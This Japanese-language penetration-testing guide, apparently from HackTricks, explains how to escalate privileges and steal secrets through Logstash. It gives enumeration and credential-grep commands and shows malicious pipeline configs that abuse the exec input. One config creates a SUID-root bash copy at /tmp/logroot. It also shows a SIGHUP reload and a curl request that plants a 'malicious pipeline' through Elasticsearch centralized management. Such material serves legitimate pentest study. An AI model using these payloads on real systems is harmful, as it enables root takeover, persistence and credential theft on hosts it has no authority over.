# Logstash 権限昇格

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash は、**pipelines** と呼ばれる仕組みを通じて、ログを**収集、変換、配信**するために使用されます。これらの pipelines は、**input**、**filter**、**output** の各ステージで構成されます。<sup>[[4]](#references)</sup> Logstash が侵害されたマシン上で動作している場合、興味深い点が生じます。

### Pipeline Configuration

Debian および RPM パッケージのインストールでは、pipeline の設定は **/etc/logstash/pipelines.yml** で行われ、このファイルに pipeline 設定の場所が記載されています。それ以外のディストリビューションでは、Logstash の `path.settings` ディレクトリに `pipelines.yml` が配置されます。<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

このファイルから、pipeline configurationを含む **.conf** filesの場所がわかります。**Elasticsearch output**を使用している場合は、`user`/`password`、`cloud_auth`、または`api_key`の設定を確認してください。アカウントの実効権限はElasticsearch側で決まります。`path.config`のglobは、そのpipelineに該当するすべてのファイルを読み込みます。<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Logstashを`pipelines.yml`の代わりに`-f <directory>`で起動すると、`-f`が優先され、**そのディレクトリ内のすべてのファイルが辞書順に連結され、単一のconfigとして解析されます**。<sup>[[6]](#references)[[7]](#references)</sup> これにより、攻撃面では次の2つの影響が生じます。

- `000-input.conf`や`zzz-output.conf`のようなファイルを配置すると、最終的なpipelineの組み立て方を変更できる
- 不正な形式のファイルがあると、連結されたconfigの検証に失敗することがある。reload中、Logstashは以前のpipelineを保持するため、auto-reloadに頼る前にpayloadを検証してください。<sup>[[1]](#references)</sup>

### 侵害したホストでの迅速な列挙

Logstashがインストールされたホストで、すばやく次を確認します。

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

また、ローカルの監視 API に到達できるか確認してください。デフォルトでは **127.0.0.1:9600** にバインドされており、通常はホストに侵入した後であれば十分です。<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

これらのエンドポイントでは、pipeline IDと設定、実行時メトリクス、設定の再読み込みの成功・失敗カウンターが公開されるため、変更が受け入れられたかどうかを確認できます。<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

復元した認証情報が**Elasticsearch**を対象としている場合は、[Elasticsearchに関するこちらのページ](../../network-services-pentesting/9200-pentesting-elasticsearch.md)を確認してください。

### ファイル入力から動的なコマンド出力への連携

現在のユーザーにはpipeline設定への読み取り権限しかなくても、その[file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file)がユーザーの書き込み可能なパスを監視している場合があります。読み込まれたpipelineについて、入力から[Grok field capture](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok)を経て[exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec)に至る処理をたどってください。exec outputは`command`をshell経由で実行し、`%{field}`の値をshellメタ文字のサニタイズなしで置換します。書き込み可能な入力パスが権限昇格につながるのは、実行中のサービスがより高い権限で動作しており、ユーザーが作成したファイルが実際に監視対象の入力に取り込まれ、filterとoutputの条件によってその内容がcommand fieldに渡され、さらにそのoutput pluginがインストールされて有効になっている場合に限られます。ディレクトリの検索・書き込み権限、file inputの追跡状態、実効サービスアカウントはそれぞれ個別に確認してください。パッシブな列挙中に、テストイベントを書き込んだりoutputを実行したりしてはいけません。

### 書き込み可能なPipelineによるPrivilege Escalation

Privilege Escalationを試みる前に、Logstashサービスが実際にどのユーザーで実行されているかを特定してください。rootまたは**logstash**ユーザーだと決めつけてはいけません。次の条件の**いずれか1つ**を満たしていることを確認してください。

- pipelineの**.conf**ファイルへの**書き込み権限**がある、または
- **/etc/logstash/pipelines.yml**ファイルでwildcardが使用されており、その対象フォルダーに書き込める。<sup>[[6]](#references)[[7]](#references)</sup>

さらに、次の条件の**いずれか1つ**を満たす必要があります。

- Logstashサービスを再起動できる、または
- **/etc/logstash/logstash.yml**ファイルで**config.reload.automatic: true**が設定されている。<sup>[[1]](#references)[[15]](#references)</sup>

設定にwildcardがある場合、それに一致するファイルを作成するとコマンドを実行できます。<sup>[[7]](#references)[[9]](#references)</sup> たとえば、次のとおりです。

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

ここで、**interval**は実行頻度を秒単位で指定します。例では、**whoami**コマンドが120秒ごとに実行され、出力は**/tmp/output.log**に書き込まれます。<sup>[[9]](#references)</sup>

**/etc/logstash/logstash.yml**で**config.reload.automatic: true**に設定すると、Logstashは再起動しなくても、新規または変更されたpipeline設定を自動的に検出して適用します。<sup>[[1]](#references)[[15]](#references)</sup> ワイルドカードがない場合でも既存の設定は変更できますが、サービスへの影響を避けるため注意が必要です。

### より信頼性の高いPipeline Payload

`exec` input pluginは現在のリリースでも引き続き動作し、`interval`または`schedule`のいずれかが必要です。Logstash JVMを**fork**して実行するため、メモリが不足している場合、payloadは何も起こらずに実行されるのではなく、`ENOMEM`で失敗する可能性があります。<sup>[[9]](#references)</sup>

サービスにroot所有のSUIDファイルを作成するのに十分な権限がある場合、実用的な権限昇格payloadは、永続的なartifactを残すものです：

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

再起動する権限がなくてもプロセスにシグナルを送信できる場合、Logstash は Unix 系システムで **SIGHUP** による reload にも対応しています。<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

すべてのプラグインが reload に対応しているわけではない点に注意してください。たとえば、**stdin** input は自動 reload を妨げるため、`config.reload.automatic` が常に変更を反映するとは限りません。<sup>[[1]](#references)</sup>

### Logstash からの秘密情報の窃取

code execution だけに注目する前に、Logstash がすでにアクセスできるデータを収集してください。

- 認証情報は `elasticsearch {}` outputs、`http_poller` の URL／設定、JDBC inputs、または cloud 関連の設定に含まれている場合があります。これらのプラグインには、検索する価値のある認証情報フィールドがあります。<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings は **`/etc/logstash/logstash.keystore`** または別の `path.settings` ディレクトリに保存されている場合があります。<sup>[[5]](#references)[[10]](#references)</sup>
- keystore のパスワードは **`LOGSTASH_KEYSTORE_PASS`** を通じて指定される場合があり、RPM/DEB インストールではサービスの環境変数は **`/etc/sysconfig/logstash`** から読み込まれます。<sup>[[10]](#references)</sup>
- `${VAR}` による環境変数の展開は Logstash の起動時に行われるため、サービス環境を調べる価値があります。<sup>[[14]](#references)</sup>

確認に役立つ項目:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

これは確認しておく価値もあります。**CVE-2023-46672** では、特定の状況下で、Logstash が keystore に保存され、設定から参照される secrets を含む機密情報をログに記録していたことが明らかになりました。該当する状況に当てはまる可能性がある場合は、古い Logstash のログと `journald` のエントリを確認してください。<sup>[[3]](#references)</sup>

### 集中管理された Pipeline Management の悪用

環境によっては、ホストがローカルの `.conf` ファイルにまったく依存していない場合があります。**`xpack.management.enabled: true`** が設定されていると、Logstash は Elasticsearch/Kibana から集中管理された pipelines を取得できます。このモードを有効にすると、ローカルの pipeline configs は正とする情報源ではなくなります。<sup>[[2]](#references)</sup>

つまり、別の攻撃経路が存在します。

1. ローカルの Logstash 設定、keystore、またはログから Elastic の認証情報を復元します。<sup>[[3]](#references)[[10]](#references)</sup>
2. アカウントに **`manage_logstash_pipelines`** クラスタ権限があるか確認します。<sup>[[16]](#references)</sup>
3. 集中管理された pipeline を作成または置き換え、次のポーリング間隔で Logstash ホストに payload を実行させます。<sup>[[2]](#references)[[16]](#references)</sup>

この機能で使用される Elasticsearch API は次のとおりです。<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

これは、ローカルファイルが読み取り専用でも、Logstashがリモートからpipelineを取得するようにすでに登録されている場合に特に有用です。<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elasticドキュメント: 設定ファイルの再読み込み](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elasticドキュメント: 集中管理型pipeline管理の設定](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 セキュリティアップデート (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elasticドキュメント: Logstash pipelineの作成](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elasticドキュメント: Logstashディレクトリのレイアウト](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elasticドキュメント: 複数のpipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elasticドキュメント: コマンドラインからのLogstashの実行](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elasticドキュメント: APIを使用したLogstashの監視](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elasticドキュメント: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elasticドキュメント: セキュアな設定のためのSecrets keystore](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elasticドキュメント: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elasticドキュメント: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elasticドキュメント: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elasticドキュメント: 環境変数の使用](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elasticドキュメント: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Logstash pipelineの作成または更新](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: pipelineの設定の取得](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: pipelineの統計情報の取得](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
